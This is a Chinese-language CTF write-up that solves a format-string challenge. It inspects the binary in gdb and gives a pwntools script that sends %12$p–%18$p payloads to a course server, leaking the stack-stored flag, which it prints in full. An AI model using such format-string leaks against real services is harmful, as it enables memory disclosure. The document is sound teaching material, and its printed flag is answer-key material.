# Level 2 - fmtstr

[題目]

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/20211115/image/fmtstr_topic.png)

[解題]

首先，我們可以看到題目給我們兩個檔案 **fmtstr** 和 **fmtstr.c**，打開 fmtstr.c 進行原始碼分析。

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/20211115/image/fmtstr_c.png)

我們可以看到程式碼中有 **MyFirstCTF{??????????????????????????????????????????????}**，即是我們想要的 flag。接著進行程式行為分析，執行 fmtstr 檔案。
> ./fmtstr
```
input:1
output:1

input:%p
output:0x7f46f939c9f0          ==> 表示有 format string 漏洞 
```
下一步，開始進行逆向分析，使用 gdb。
> gdb fmtstr

> b main

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/20211115/image/fmtstr_gdb.png)

> r

Output:
```
────────────────────────────────── Registers ───────────────────────────────────
RAX: 0x4006c6 (<main>:	push   rbp)
RBX: 0x0 
RCX: 0x7ffff7faa718 --> 0x7ffff7fabd80 --> 0x0 
RDX: 0x7fffffffe278 --> 0x7fffffffe56a ("SHELL=/bin/bash")
RSI: 0x7fffffffe268 --> 0x7fffffffe54d ("/root/NTHU/CTF/fmtstr/fmtstr")
RDI: 0x1 
RBP: 0x7fffffffe180 --> 0x4007c0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe180 --> 0x4007c0 (<__libc_csu_init>:	push   r15)
RIP: 0x4006ca (<main+4>:	sub    rsp,0x70)
R8 : 0x7ffff7fabd80 --> 0x0 
R9 : 0x7ffff7fabd80 --> 0x0 
R10: 0xfffffffffffff427 
R11: 0x7ffff7e12fb0 (<__libc_start_main>:	push   r14)
R12: 0x4005d0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe260 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
───────────────────────────────────── Code ─────────────────────────────────────
   0x4006c1 <frame_dummy+33>:	jmp    0x400640 <register_tm_clones>
   0x4006c6 <main>:	push   rbp
   0x4006c7 <main+1>:	mov    rbp,rsp
=> 0x4006ca <main+4>:	sub    rsp,0x70
   0x4006ce <main+8>:	mov    rax,QWORD PTR fs:0x28
   0x4006d7 <main+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x4006db <main+21>:	xor    eax,eax
   0x4006dd <main+23>:	
    mov    rax,QWORD PTR [rip+0x20096c]        # 0x601050 <stdout@@GLIBC_2.2.5>
──────────────────────────────────── Stack ─────────────────────────────────────
0000| 0x7fffffffe180 --> 0x4007c0 (<__libc_csu_init>:	push   r15)
0008| 0x7fffffffe188 --> 0x7ffff7e1309b (<__libc_start_main+235>:	mov    edi,eax)
0016| 0x7fffffffe190 --> 0x0 
0024| 0x7fffffffe198 --> 0x7fffffffe268 --> 0x7fffffffe54d ("/root/NTHU/CTF/fmtstr/fmtstr")
0032| 0x7fffffffe1a0 --> 0x100000000 
0040| 0x7fffffffe1a8 --> 0x4006c6 (<main>:	push   rbp)
0048| 0x7fffffffe1b0 --> 0x0 
0056| 0x7fffffffe1b8 --> 0x501688d5d77e22ae 
────────────────────────────────────────────────────────────────────────────────
Legend: code, data, rodata, heap, value

Breakpoint 1, 0x00000000004006ca in main ()

```
> ni   ==>一直到scanf
```
───────────────────────────────────── Code ─────────────────────────────────────
   0x40077c <main+182>:	mov    edi,0x400844
   0x400781 <main+187>:	mov    eax,0x0
   0x400786 <main+192>:	call   0x4005b0 <__isoc99_scanf@plt>
=> 0x40078b <main+197>:	lea    rax,[rbp-0x70]
   0x40078f <main+201>:	mov    rdi,rax
   0x400792 <main+204>:	mov    eax,0x0
   0x400797 <main+209>:	call   0x400580 <printf@plt>
   0x40079c <main+214>:	mov    eax,0x0
[rbp-0x70] : 0x7fffffffe110 --> 0xff0000000071 
──────────────────────────────────── Stack ─────────────────────────────────────
0000| 0x7fffffffe110 --> 0xff0000000071 
0008| 0x7fffffffe118 --> 0x0 
0016| 0x7fffffffe120 --> 0x0 
0024| 0x7fffffffe128 --> 0xff00000000 
0032| 0x7fffffffe130 --> 0x0 
0040| 0x7fffffffe138 --> 0x0 
0048| 0x7fffffffe140 ("FLAG{", '?' <repeats 46 times>, "}")
0056| 0x7fffffffe148 ('?' <repeats 43 times>, "}")
────────────────────────────────────────────────────────────────────────────────
Legend: code, data, rodata, heap, value
0x000000000040078b in main ()
```

在 gdb 裡，為了方便除錯，它將程式碼以副程式為單位分成一個個的區塊 (frame)。比如說，main() 會被視為一個 frame，而其他 function 則會被視為另一個 frame。因而在利用 gdb 除錯時，可以直接執行某個 frame、跳至上一個或下一個 frame、直接執行至該 frame 結束... 等等，而加快在使用 gdb 來 debug 的速度並降低 debug 的困難度。

在 frame 與 frame 之間，正在執行的區塊就是 frame 0。呼叫該區塊的就是 frame 1；而再上上一層的就叫 frame 2，以此類推。

在 gdb 進入另一個 frame 之前，它會將該 frame 的一些變數值之類的儲存至堆疊 (stack) 裡，等到從 frame 回來後再從這些 stack 裡把這些變數值取回來。

> stack 14

Output:
```
0000| 0x7fffffffe110 --> 0xff0000000071 
0008| 0x7fffffffe118 --> 0x0 
0016| 0x7fffffffe120 --> 0x0 
0024| 0x7fffffffe128 --> 0xff00000000 
0032| 0x7fffffffe130 --> 0x0 
0040| 0x7fffffffe138 --> 0x0 
0048| 0x7fffffffe140 ("FLAG{", '?' <repeats 46 times>, "}")
0056| 0x7fffffffe148 ('?' <repeats 43 times>, "}")
0064| 0x7fffffffe150 ('?' <repeats 35 times>, "}")
0072| 0x7fffffffe158 ('?' <repeats 27 times>, "}")
0080| 0x7fffffffe160 ('?' <repeats 19 times>, "}")
0088| 0x7fffffffe168 ('?' <repeats 11 times>, "}")
0096| 0x7fffffffe170 --> 0x7d3f3f3f ('???}')
0104| 0x7fffffffe178 --> 0x4e5fab838babda00 
```

可以看到 %12$p 到 %18$p 是我們要解開的位置，開始撰寫 exploit code。
> gedit exploit.py
```
from pwn import *

ip = "120.114.62.211"
port = 6127

r = remote(ip, port)

payload = ""

for i in range(12, 19):
    payload += "%{}$p".format(i)


r.sendline(payload)
out = r.recv()

print(type(out))
print(out)
```
> python3 exploit.py
```
[+] Opening connection to 120.114.62.211 on port 6127: Done
exploit.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendline(payload)
<class 'bytes'>
b'0x437473726946794d0x346d7230667b46540x676e317254735f740x61336c5f6e34635f0x5479723376335f4b0x5f6e305f476e31680x7d54735f334874'
MyFirstCTF{f0rm4t_sTr1ng_c4n_l3aK_3v3ryTh1nG_0n_tH3_sT}
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```
我們可以看到 **MyFirstCTF{f0rm4t_sTr1ng_c4n_l3aK_3v3ryTh1nG_0n_tH3_sT}**，即找到 flag 了!!

[END]
